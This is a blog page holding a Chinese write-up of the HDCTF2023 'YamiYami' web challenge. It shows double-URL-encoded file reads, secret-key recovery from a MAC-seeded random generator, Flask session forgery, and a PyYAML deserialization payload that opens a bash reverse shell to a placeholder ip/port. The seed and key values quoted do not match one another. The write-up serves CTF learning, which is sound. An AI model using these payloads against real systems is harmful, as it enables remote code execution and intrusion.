@@ -1,0 +1,332 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="pragma" content="no-cache">
+  <meta http-equiv="cache-control" content="no-cache">
+  <meta http-equiv="expires" content="0">
+  
+  <title>HDCTF2023-YamiYami-wp | Antel0p3&#39;s blog</title>
+  <meta name="author" content="John Doe">
+  
+  <meta name="description" content="题目链接  
+三个链接    第一个可以通过file伪协议读取任意文件  第二个上传文件   第三个pwd说明当前目录在&amp;#x2F;app
+非预期:在read路由读环境变量:&amp;#x2F;proc&amp;#x2F;1&amp;#x2F;environ得到flag:NSSCTF{944467cc-e7ef-446b-">
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <meta property="og:title" content="HDCTF2023-YamiYami-wp"/>
+  <meta property="og:site_name" content="Antel0p3&#39;s blog"/>
+
+  
+    <meta property="og:image" content=""/>
+  
+
+  
+    <link rel="alternative" href="/atom.xml" title="Antel0p3&#39;s blog" type="application/atom+xml">
+  
+  
+    <link href="/favicon.png" rel="icon">
+  
+  
+  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/prism.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+
+  <script src="/js/jquery-2.0.3.min.js"></script>
+
+  <!-- analytics -->
+  
+  <!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-70812759-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-70812759-1');
+</script>
+
+
+
+
+
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+ <body>  
+  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+    <div class="container">
+      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+		<span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+	  <a class="navbar-brand" href="/">Antel0p3&#39;s blog</a>
+      <div class="collapse navbar-collapse nav-menu">
+		<ul class="nav navbar-nav">
+		  
+		  <li>
+			<a href="/archives" title="All the articles.">
+			  <i class="fa fa-archive"></i>Archives
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/categories" title="All the categories.">
+			  <i class="fa fa-folder"></i>Categories
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/tags" title="All the tags.">
+			  <i class="fa fa-tags"></i>Tags
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/about" title="About me.">
+			  <i class="fa fa-user"></i>About
+			</a>
+		  </li>
+		  
+		</ul>
+      </div>
+    </div> <!-- container -->
+</nav>
+<div class="clearfix"></div>
+
+  <div class="container">
+  	<div class="content">
+    	 
+
+
+					
+							<div class="page-header">
+								<h1>
+									
+											
+												HDCTF2023-YamiYami-wp
+									
+									
+								</h1>
+								
+									<p id="/2023/10/25/HDCTF2023-YamiYami-wp/" class="leancloud-visitors view"
+										data-flag-title="HDCTF2023-YamiYami-wp">
+										<i class="fa fa-eye"></i> <i class="leancloud-visitors-count"></i>
+									</p>
+									
+							</div>
+							
+								
+
+<div class="row post">
+	<!-- cols -->
+	
+	<div id="top_meta">
+		
+	</div>
+	<div class="col-md-9">
+	
+
+	<!-- content -->
+	<div class="mypage">		
+	  		
+
+	  <p><a target="_blank" rel="noopener" href="https://www.nssctf.cn/problem/3780">题目链接</a>  </p>
+<p>三个链接    第一个可以通过file伪协议读取任意文件  第二个上传文件   第三个pwd说明当前目录在&#x2F;app</p>
+<p>非预期:<br>在read路由读环境变量:&#x2F;proc&#x2F;1&#x2F;environ得到flag:NSSCTF{944467cc-e7ef-446b-92f6-b5f45479e30e}</p>
+<p>预期:<br>在&#x2F;read路由尝试读app.py和flag发现被正则过滤,url二次编码app&#x2F;app.py:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file:<span class="comment">///%25%36%31%25%37%30%25%37%30%25%32%46%25%36%31%25%37%30%25%37%30%25%32%45%25%37%30%25%37%39</span></span><br></pre></td></tr></table></figure>
+
+<p>得到源码</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> re, random, uuid</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> werkzeug.utils <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> yaml</span><br><span class="line"><span class="keyword">from</span> urllib.request <span class="keyword">import</span> urlopen</span><br><span class="line">app = Flask(__name__)</span><br><span class="line">random.seed(uuid.getnode())</span><br><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = <span class="built_in">str</span>(random.random()*<span class="number">233</span>)</span><br><span class="line">app.debug = <span class="literal">False</span></span><br><span class="line">BLACK_LIST=[<span class="string">&quot;yaml&quot;</span>,<span class="string">&quot;YAML&quot;</span>,<span class="string">&quot;YML&quot;</span>,<span class="string">&quot;yml&quot;</span>,<span class="string">&quot;yamiyami&quot;</span>]</span><br><span class="line">app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>]=<span class="string">&quot;/app/uploads&quot;</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    session[<span class="string">&#x27;passport&#x27;</span>] = <span class="string">&#x27;YamiYami&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    Welcome to HDCTF2023 &lt;a href=&quot;[/read?url=https://baidu.com](view-source:http://node2.anna.nssctf.cn:28427/read?url=https://baidu.com)&quot;&gt;Read somethings&lt;/a&gt;</span></span><br><span class="line"><span class="string">    &lt;br&gt;</span></span><br><span class="line"><span class="string">    Here is the challenge &lt;a href=&quot;[/upload](view-source:http://node2.anna.nssctf.cn:28427/upload)&quot;&gt;Upload file&lt;/a&gt;</span></span><br><span class="line"><span class="string">    &lt;br&gt;</span></span><br><span class="line"><span class="string">    Enjoy it &lt;a href=&quot;[/pwd](view-source:http://node2.anna.nssctf.cn:28427/pwd)&quot;&gt;pwd&lt;/a&gt;</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/pwd&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwd</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">str</span>(pwdpath)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/read&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        url = request.args.get(<span class="string">&#x27;url&#x27;</span>)</span><br><span class="line">        m = re.findall(<span class="string">&#x27;app.*&#x27;</span>, url, re.IGNORECASE)</span><br><span class="line">        n = re.findall(<span class="string">&#x27;flag&#x27;</span>, url, re.IGNORECASE)</span><br><span class="line">        <span class="keyword">if</span> m:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;re.findall(&#x27;app.*&#x27;, url, re.IGNORECASE)&quot;</span></span><br><span class="line">        <span class="keyword">if</span> n:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;re.findall(&#x27;flag&#x27;, url, re.IGNORECASE)&quot;</span></span><br><span class="line">        res = urlopen(url)</span><br><span class="line">        <span class="keyword">return</span> res.read()</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> ex:</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">str</span>(ex))</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;no response&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">allowed_file</span>(<span class="params">filename</span>):</span><br><span class="line">   <span class="keyword">for</span> blackstr <span class="keyword">in</span> BLACK_LIST:</span><br><span class="line">       <span class="keyword">if</span> blackstr <span class="keyword">in</span> filename:</span><br><span class="line">           <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">   <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/upload&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload_file</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;file&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> request.files:</span><br><span class="line">            flash(<span class="string">&#x27;No file part&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span> redirect(request.url)</span><br><span class="line">        file = request.files[<span class="string">&#x27;file&#x27;</span>]</span><br><span class="line">        <span class="keyword">if</span> file.filename == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Empty file&quot;</span></span><br><span class="line">        <span class="keyword">if</span> file <span class="keyword">and</span> allowed_file(file.filename):</span><br><span class="line">            filename = secure_filename(file.filename)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(<span class="string">&#x27;./uploads/&#x27;</span>):</span><br><span class="line">                os.makedirs(<span class="string">&#x27;./uploads/&#x27;</span>)</span><br><span class="line">            file.save(os.path.join(app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>], filename))</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;upload successfully!&quot;</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/boogipop&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">load</span>():</span><br><span class="line">    <span class="keyword">if</span> session.get(<span class="string">&quot;passport&quot;</span>)==<span class="string">&quot;Welcome To HDCTF2023&quot;</span>:</span><br><span class="line">        LoadedFile=request.args.get(<span class="string">&quot;file&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(LoadedFile):</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;file not exists&quot;</span></span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(LoadedFile) <span class="keyword">as</span> f:</span><br><span class="line">            yaml.full_load(f)</span><br><span class="line">            f.close()</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;van you see&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;No Auth bro&quot;</span></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    pwdpath = os.popen(<span class="string">&quot;pwd&quot;</span>).read()</span><br><span class="line">    app.run(</span><br><span class="line">        debug=<span class="literal">False</span>,</span><br><span class="line">        host=<span class="string">&quot;0.0.0.0&quot;</span></span><br><span class="line">    )</span><br><span class="line">    <span class="built_in">print</span>(app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>])</span><br></pre></td></tr></table></figure>
+
+<p>访问&#x2F;boogipop并传递file文件名 会执行yaml.full_load(f)，触发pyyaml反序列化，但session伪造使得<code>session[passport]=Welcome To HDCTF2023</code>.</p>
+<p>其中<code>random.seed(uuid.getnode())</code> 是使用 Python 中的 <code>random</code> 模块来设置随机数生成器的种子(seed)。在这里，<code>uuid.getnode()</code> 函数返回本机的MAC地址  而<code>app.config[&#39;SECRET_KEY&#39;] = str(random.random()*233)</code>,说明这个secret_key我们可以获取,网卡地址可以通过读取<code>/sys/class/net/eth0/address</code>,得到<code>02:42:ac:02:6c:b9</code></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random  </span><br><span class="line">random.seed(<span class="number">0x0242ac0221e1</span>)  </span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">str</span>(random.random()*<span class="number">233</span>))</span><br></pre></td></tr></table></figure>
+
+<p>得到secret_key是:158.36050847457943</p>
+<p>加密:</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ ./flask_session_cookie_manager3.py encode -t <span class="string">&#x27;&#123;&quot;passport&quot;:&quot;Welcome To HDCTF2023&quot;&#125;&#x27;</span> -s <span class="string">&#x27;211.00504154872561&#x27;</span></span><br><span class="line"><span class="comment"># eyJwYXNzcG9ydCI6IldlbGNvbWUgVG8gSERDVEYyMDIzIn0.ZTkiaQ.X7A8EquGmn7zc7B2yYoiqW-fc1Y</span></span><br></pre></td></tr></table></figure>
+
+<p>yaml反序列化内容</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">!!python/object/new:str</span><br><span class="line">    args: []</span><br><span class="line">    state: !!python/tuple</span><br><span class="line">      - &quot;__import__(&#x27;os&#x27;).system(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/ip/port &lt;&amp;1\&quot;&#x27;)&quot;</span><br><span class="line">      - !!python/object/new:staticmethod</span><br><span class="line">        args: []</span><br><span class="line">        state:</span><br><span class="line">          update: !!python/name:eval</span><br><span class="line">          items: !!python/name:list</span><br></pre></td></tr></table></figure>
+
+<p>命名1.txt在upload页面绕过黑名单    然后访问&#x2F;boogipop，改session  <code>file=/app/uploads/1.txt</code></p>
+
+	  <div class="article-footer-copyright">
+
+    本博客采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议(CC BY-NC-SA 4.0) 发布.</a>
+</div>
+
+	</div>
+
+	<!-- 
+		<span id="/2023/10/25/HDCTF2023-YamiYami-wp/" class="leancloud-visitors view" data-flag-title="HDCTF2023-YamiYami-wp">
+			<i class="fa fa-eye"></i> <i class="leancloud-visitors-count"></i>
+		</span>
+	 -->
+	
+	<div>
+  	<center>
+
+	<div class="pagination">
+
+    
+    
+    <a href="/2023/11/07/Backdoorctf-funsignals-wp/" type="button" class="btn btn-default"><i
+                class="fa fa-arrow-circle-o-left"></i> Prev</a>
+    
+
+    <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
+    
+    <a href="/2023/10/23/GDOUCTF2023-reverseClock-wp/" type="button" class="btn btn-default ">Next<i
+                class="fa fa-arrow-circle-o-right"></i></a>
+    
+
+    
+</div>
+
+
+    </center>
+	</div>
+	
+	<!-- comment -->
+	<!--
+<section id="comment">
+    <h2 class="title">Comments</h2>
+
+    
+</section>
+
+-->
+	
+		<section id="comments" class="comments">
+			<style>
+			.comments{margin:30px;padding:10px;background:rgb(0, 0, 0)}
+			@media screen and (max-width:800px){.comments{margin:auto;padding:10px;background:#000}}
+			</style>
+			<div id="vcomment" class="comment"></div>
+<script src='//unpkg.com/valine/dist/Valine.min.js'></script>
+<script src="https://cdnjs.loli.net/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+<script>
+var valineConfig = {"enable":true,"appId":"7m4bFydh606FgGbxRPsI8M6l-gzGzoHsz","appKey":"edXvAXhOXIvksZqtq8b5AXWj","placeholder":"input your comment: ","visitor":true,"avatar":"retro","lang":"en","metaPlaceholder":{"nick":"nick","mail":"mail","link":"link"},"requiredFields":["nick","mail","link"],"pageView":true}
+valineConfig.el='#vcomment';
+new Valine(valineConfig);
+    // new Valine({
+    //     el: '#vcomment',
+    //     appId: "",
+    //     appKey: "",
+    //     placeholder: "input your comment: ",
+    //     avatar:"retro",
+    //     visitor: "true",
+    //     requiredFields: "nick,mail,link".split(','),
+    // });
+</script>
+
+		</section>
+	
+	
+	
+	</div> <!-- col-md-9/col-md-12 -->
+
+
+	
+	<div id="side_meta">
+		<div class="col-md-3" id="post_meta"> 
+
+	<!-- date -->
+	
+	<div class="meta-widget">
+	<i class="fa fa-clock-o"></i>
+	2023-10-25 
+	</div>
+	
+
+	<!-- categories -->
+    
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#categorys"><i class="fa fa-folder"></i></a>	
+    <ul id="categorys" class="tag_box list-unstyled collapse in">
+          
+  <li>
+    <li><a href="/categories/web-wp/">web-wp<span>49</span></a></li>
+  </li>
+
+    </ul>
+	</div>
+	
+
+	<!-- tags -->
+	
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#tags"><i class="fa fa-tags"></i></a>		  
+    <ul id="tags" class="tag_box list-unstyled collapse in">	  
+	    
+  <li><a href="/tags/CTF/">CTF<span>87</span></a></li> <li><a href="/tags/nssctf/">nssctf<span>54</span></a></li> <li><a href="/tags/web/">web<span>54</span></a></li> <li><a href="/tags/afr/">afr<span>2</span></a></li> <li><a href="/tags/HDCTF2023/">HDCTF2023<span>4</span></a></li> <li><a href="/tags/flask-session/">flask session<span>3</span></a></li> <li><a href="/tags/yaml反序列化/">yaml反序列化<span>1</span></a></li> <li><a href="/tags/二次编码绕过/">二次编码绕过<span>1</span></a></li>
+    </ul>
+	</div>
+		
+
+	<!-- toc -->
+	<div class="meta-widget">
+	
+	</div>
+	
+    <hr>
+	
+</div><!-- col-md-3 -->
+
+		
+
+	</div>
+	
+		
+
+</div><!-- row -->
+
+<!--
+ -->
+
+
+
+	</div>
+  </div>
+  <div class="container-narrow">
+  <footer>  </footer>
+</div> <!-- container-narrow -->
+  
+
+
+  
+<a id="gotop" href="#">   
+  <span>⬆︎TOP</span>
+</a>
+
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/bootstrap.min.js"></script>
+<script src="/js/main.js"></script>
+<script src="/js/search.js"></script> 
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+
+</body>
+   </html>
